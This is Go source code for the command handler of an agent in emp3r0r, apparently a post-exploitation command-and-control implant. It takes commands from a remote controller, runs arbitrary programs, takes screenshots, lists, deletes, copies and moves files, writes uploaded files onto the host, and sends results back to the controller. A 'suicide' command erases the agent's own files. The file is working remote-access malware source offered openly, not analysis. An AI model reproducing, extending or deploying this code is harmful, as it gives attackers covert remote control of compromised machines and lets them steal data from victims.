package agent

import (
	"bytes"
	"fmt"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/otiai10/copy"
)

// exec cmd, receive data, etc
func processCCData(data *emp3r0r_data.MsgTunData) {
	var (
		data2send emp3r0r_data.MsgTunData
		out       string
		err       error
	)
	data2send.Tag = RuntimeConfig.AgentTag

	payloadSplit := strings.Split(data.Payload, emp3r0r_data.MagicString)
	if len(payloadSplit) <= 1 {
		log.Printf("Cannot parse CC command: %s, wrong OpSep (should be %s) maybe?",
			data.Payload, emp3r0r_data.MagicString)
		return
	}
	cmd_id := payloadSplit[len(payloadSplit)-1]

	// command from CC
	keep_running := strings.HasSuffix(payloadSplit[1], "&") // ./program & means keep running in background
	cmd_str := strings.TrimSuffix(payloadSplit[1], "&")
	cmdSlice := util.ParseCmd(cmd_str)

	// send response to CC
	sendResponse := func(resp string) {
		data2send.Payload = fmt.Sprintf("cmd%s%s%s%s",
			emp3r0r_data.MagicString,
			strings.Join(cmdSlice, " "),
			emp3r0r_data.MagicString,
			out)
		data2send.Payload += emp3r0r_data.MagicString + cmd_id // cmd_id for cmd tracking
		if err = Send2CC(&data2send); err != nil {
			log.Println(err)
		}
	}

	// # shell helpers
	// previously there was a dedicated "shell", now it is integrated
	// with the main command prompt, you can execute these commands directly
	// by typing them in emp3r0r console
	if strings.HasPrefix(cmdSlice[0], "#") {
		out = shellHelper(cmdSlice)
		sendResponse(out)
		return
	}

	// ! C2Commands
	/*
	   !command: special commands (not sent by user)
	*/
	if strings.HasPrefix(cmdSlice[0], "!") {
		out = C2CommandsHandler(cmdSlice)
		sendResponse(out)
		return
	}

	switch cmdSlice[0] {

	/*
		utils
	*/
	case "screenshot":
		if len(cmdSlice) != 1 {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}

		out, err = Screenshot()
		if err != nil || out == "" {
			out = fmt.Sprintf("Error: failed to take screenshot: %v", err)
			sendResponse(out)
			return
		}

		// move to agent root
		err = os.Rename(out, RuntimeConfig.AgentRoot+"/"+out)
		if err == nil {
			out = RuntimeConfig.AgentRoot + "/" + out
		}

		// tell CC where to download the file
		sendResponse(out)

	case "suicide":
		if len(cmdSlice) != 1 {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}
		err = os.RemoveAll(RuntimeConfig.AgentRoot)
		if err != nil {
			log.Fatalf("Failed to cleanup files")
		}
		log.Println("Exiting")
		os.Exit(0)

		/*
			fs commands
		*/

		// ls current path
	case "ls":
		target_dir := "."
		if len(cmdSlice) > 1 && !strings.HasPrefix(cmdSlice[1], "--") {
			target_dir = cmdSlice[1]
		} else {
			target_dir, err = os.Getwd()
			if err != nil {
				log.Printf("cwd: %v", err)
				sendResponse(err.Error())
				return
			}
		}
		log.Printf("Listing %s", target_dir)
		out, err = util.LsPath(target_dir)
		if err != nil {
			out = err.Error()
		}
		sendResponse(out)

		// remove file/dir
	case "rm":
		if len(cmdSlice) < 2 {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}

		path := strings.Join(cmdSlice[1:], " ")
		out = "Deleted " + path
		if err = os.RemoveAll(path); err != nil {
			out = fmt.Sprintf("Failed to delete %s: %v", path, err)
		}
		sendResponse(out)

		// mkdir
	case "mkdir":
		if len(cmdSlice) < 2 {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}

		path := strings.Join(cmdSlice[1:], " ")
		out = "Mkdir " + path
		if err = os.MkdirAll(path, 0700); err != nil {
			out = fmt.Sprintf("Failed to mkdir %s: %v", path, err)
		}
		sendResponse(out)

		// copy file/dir
	case "cp":
		if len(cmdSlice) < 3 {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}

		out = fmt.Sprintf("%s has been copied to %s", cmdSlice[1], cmdSlice[2])
		if err = copy.Copy(cmdSlice[1], cmdSlice[2]); err != nil {
			out = fmt.Sprintf("Failed to copy %s to %s: %v", cmdSlice[1], cmdSlice[2], err)
		}
		sendResponse(out)

		// move file/dir
	case "mv":
		if len(cmdSlice) < 3 {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}

		out = fmt.Sprintf("%s has been moved to %s", cmdSlice[1], cmdSlice[2])
		if err = os.Rename(cmdSlice[1], cmdSlice[2]); err != nil {
			out = fmt.Sprintf("Failed to move %s to %s: %v", cmdSlice[1], cmdSlice[2], err)
		}
		sendResponse(out)

		// change directory
	case "cd":
		out = "cd failed"
		if len(cmdSlice) < 2 {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}

		path := strings.Join(cmdSlice[1:], " ")
		if os.Chdir(path) == nil {
			out = "changed directory to " + strconv.Quote(path)
		}
		sendResponse(out)

		// current working directory
	case "pwd":
		if len(cmdSlice) != 1 {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}

		pwd, err := os.Getwd()
		if err != nil {
			log.Println("processCCData: cant get pwd: ", err)
			pwd = err.Error()
		}

		out = "current working directory: " + pwd
		sendResponse(out)

		// put file on agent
	case "put":
		if len(cmdSlice) < 4 {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}

		file_to_download := cmdSlice[1]
		path := cmdSlice[2]
		size, err := strconv.ParseInt(cmdSlice[3], 10, 64)
		if err != nil {
			out = fmt.Sprintf("processCCData: cant get size of %s: %v", file_to_download, err)
			sendResponse(out)
			return
		}
		_, err = DownloadViaCC(file_to_download, path)
		if err != nil {
			out = fmt.Sprintf("processCCData: cant download %s: %v", file_to_download, err)
			sendResponse(out)
			return
		}

		// checksum
		checksum := tun.SHA256SumFile(path)
		downloadedSize := util.FileSize(path)
		out = fmt.Sprintf("%s has been uploaded successfully, sha256sum: %s", path, checksum)
		if downloadedSize < size {
			out = fmt.Sprintf("Uploaded %d of %d bytes, sha256sum: %s\nYou can run `put` again to resume uploading", downloadedSize, size, checksum)
		}

		sendResponse(out)

	default:
		// exec cmd using os/exec normally, sends stdout and stderr back to CC
		if runtime.GOOS != "linux" {
			if !strings.HasSuffix(cmdSlice[0], ".exe") {
				cmdSlice[0] += ".exe"
			}
		}
		cmd := exec.Command(cmdSlice[0], cmdSlice[1:]...)
		var out_bytes []byte
		out_buf := bytes.NewBuffer(out_bytes)
		cmd.Stdout = out_buf
		cmd.Stderr = out_buf
		err = cmd.Start()
		if err != nil {
			log.Println(err)
			out = fmt.Sprintf("%s\n%v", out_buf.Bytes(), err)
		} else {
			// kill process after 10 seconds
			// except when & is appended
			if !keep_running {
				cmd.Wait()
			}
			go func() {
				for i := 0; i < 10; i++ {
					time.Sleep(time.Second)
				}
				if !keep_running && util.IsPIDAlive(cmd.Process.Pid) {
					err = cmd.Process.Kill()
					out = fmt.Sprintf("Killing %d, which has been running for more than 10s, status %v",
						cmd.Process.Pid, err)
					sendResponse(out)
					return
				}
			}()
		}
		out = out_buf.String()
		if keep_running {
			out = fmt.Sprintf("%s running in background, PID is %d",
				cmdSlice, cmd.Process.Pid)
		}

		sendResponse(out)
	}
}
